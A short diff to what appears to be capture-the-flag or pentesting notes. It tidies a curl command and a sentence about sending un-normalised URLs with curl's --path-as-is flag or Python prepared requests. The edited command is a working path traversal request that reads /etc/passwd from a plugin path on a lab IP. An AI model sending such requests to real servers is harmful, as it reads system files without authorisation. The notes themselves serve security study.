@@ -36,10 +36,10 @@ Use requests.content instead of requests.text for bytes-type data.
 For sending GET requests without url normalization, use curl with --path-as-is
 
 ```bash
-curl http://10.10.11.183:3000/public/plugins/stat/../../../../../../../../etc/passwd --path-as-is -x 127.0.0.1:8080
+curl --path-as-is http://10.10.11.183:3000/public/plugins/stat/../../../../../../../../etc/passwd -x 127.0.0.1:8080
 ```
 
-with requests module in python3, using requests.get will not work. Need to use prepared requests.
+With requests module in python3, using requests.get will not work. Need to use prepared requests.
 [Docs](https://requests.readthedocs.io/en/latest/user/advanced/#prepared-requests)
 
 ```python
